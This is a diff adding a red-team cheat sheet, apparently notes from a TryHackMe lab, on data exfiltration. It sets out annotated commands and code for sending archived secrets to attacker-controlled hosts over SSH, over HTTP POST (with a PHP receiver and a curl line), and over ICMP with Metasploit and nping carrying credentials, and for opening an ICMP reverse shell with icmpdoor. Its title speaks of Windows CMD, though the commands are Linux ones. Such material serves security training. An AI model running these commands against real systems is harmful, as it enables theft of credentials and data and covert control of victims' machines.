@@ -1,1 +1,92 @@
 Windows Data Exfiltration techniques using CMD for Red Team Operations
+
+Exfiltration using SSH:
+cat task/credentials.txt                Sensitive data to be exfiltrated
+tar cf - task/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -" 
+                                        An attacker needs to control a server, which in this case has an SSH server enabled, to receive the exfiltrated data
+                                        The `tar` command to create an archive file of the `task` directory
+                                        Then pass the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.
+                                        Then pass the command that must be executed in double quotations, `"cd /tmp/; tar xpf`. In this case, we change the directory 
+                                        and unarchive the passed file
+
+HTTP POST Request Data Exfiltration:
+<?php 
+if (isset($_POST['file'])) {
+        $file = fopen("/tmp/http.bs64","w");
+        fwrite($file, $_POST['file']);
+        fclose($file);
+   }
+?>
+                                        As a requirement for this technique, an attacker needs control over a webserver with a server-side programming language installed and enabled
+                                        Prepare a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST
+                                        requests via a `file` parameter and stores the received data in the `/tmp` directory as `http.bs64` file name
+ssh thm@victim1.thm.com
+                                        Now from the attacker machine, connect to the `victim1.thm.com` machine via SSH to exfiltrate the required data over the HTTP protocol
+curl --data "file=$(tar zcf - secret-folder | base64)" http://web.thm.com/contact.php
+                                        Now that we have our data, we will be using the `curl` command to send an HTTP POST request with the content of the secret folder
+                                        We used the `curl`  command with `--data` argument to send a POST request via the `file` parameter. Note that we created
+                                        an archived file of the secret folder using the `tar` command. We also converted the output of the `tar`  command into `base64` representation
+cat /tmp/http.bs64
+                                        From the attacker machine, log in to the webserver, `web.thm.com`, and check the `/tmp` directory if we have successfully transferred the required data
+                                        The received data, `http.bs64` file, you can is broken `base64`. This happens due to the URL encoding over the HTTP. The + symbol has been 
+                                        replaced with empty spaces, so let's fix it
+sudo sed -i 's/ /+/g' /tmp/http.bs64    Replace the spaces with `+` characters to make it a valid `base64` string
+cat /tmp/http.bs64 | base64 -d | tar xvfz -
+                                        Decode the `base64` string using the `base64` command with `-d` argument,
+                                        then pass the decoded file and unarchived it using the `tar` command
+
+ICMP Data Exfiltration:
+use auxiliary/server/icmp_exfil
+set BPF_FILTER icmp and not src ATTACKBOX_IP
+                                        Set up the Metasploit framework by selecting the `icmp_exfil` module to make it ready to capture and listen for `ICMP` traffic.
+                                        One of the requirements for this module is to set the `BPF_FILTER` option, which is based on `TCPDUMP` rules, to capture only `ICMP`
+                                        packets and ignore any `ICMP` packets that have the source IP of the attacking machine
+set INTERFACE eth0                      Select which network interface to listen to
+run                                     Start the module
+ssh thm@victim-machine.com              
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
+                                        On the victim machine we can use tool such as [Nping](https://nmap.org/nping/) to send the BOF trigger from the ICMP machine so that
+                                        the Metasploit framework starts writing to the disk. We sent one `ICMP` packet using the `nping` command with `--data-string` argument.
+                                        We specify the trigger value with the file name `BOFfile.txt`, set by default in the Metasploit framework
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
+                                        Start sending the required data and the end of the file trigger value from the `ICMP` machine and check the AttackBox once we have
+                                        done sending the data and the ending `trigger` value.
+
+ICMP C2 Communication:
+sudo icmpdoor -i eth0 -d VICTIM_IP      Must be `eth0`. We specify the interface to communicate over and the destination IP of the server-side
+sudo icmp-cnc -i eth1 -d ATTACKER_IP    Log in to the attacker machine and execute the `icmp-cnc` binary to communicate with the victim. 
+                                        Once the execution runs correctly, a communication channel is established over the `ICMP` protocol. 
+                                        Now we are ready to send the command that needs to be executed on the victim machine.
+shell: hostname                         Ensure to select the interface for the communication as well as the destination IP. We requested to
+hostname                                execute the `hostname` command, and we received `icmp-host`
+shell: icmp-host
+
+Informational:
+Sensitive data can be in various types and forms, and it may contain the following:
+  Usernames and passwords or any authentication information
+  Bank accounts details
+  Business strategic decisions
+  Cryptographic keys
+  Employee and personnel information
+  Project code data
+
+  Exfiltration data through the HTTP protocol is one of the best options because it
+  is challenging to detect. It is tough to distinguish between legitimate and malicious HTTP traffic
+
+To exfiltrate data over the HTTP protocol, we can apply the following steps:
+  1. An attacker sets up a web server with a data handler. In our case, it will be `web.thm.com` and the `contact.php` page as a data handler.
+  2. A C2 agent or an attacker sends the data. In our case, we will send data using the `curl` command.
+  3. The webserver receives the data and stores it. In our case, the `contact.php` receives the POST request and stores it into `/tmp`.
+  4. The attacker logs into the webserver to have a copy of the received data.
+  5. Since we are using the HTTP protocol, the data will be sent in cleartext. However, we will be using other techniques (`tar` and `base64`)
+  to change the data's string format so that it wouldn't be in a human-readable format.
+
+  One of the benefits of HTTPS is encrypting the transmitted data using SSL keys stored on a server.
+  If you apply the same technique we showed previously on a web server with SSL enabled, then we can see that all transmitted data will be encrypted.
+  To set up HTTPS Server visit: https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04
+
+  [ICMPDoor](https://github.com/krabelize/icmpdoor) is an open-source reverse-shell written in Python3 and scapy. 
+  The methodology is the same with the only difference that an attacker sends a command that needs to be executed
+  on a victim's machine. Once the command is executed, a victim machine sends the execution output within the `ICMP` packet in the `Data` section.
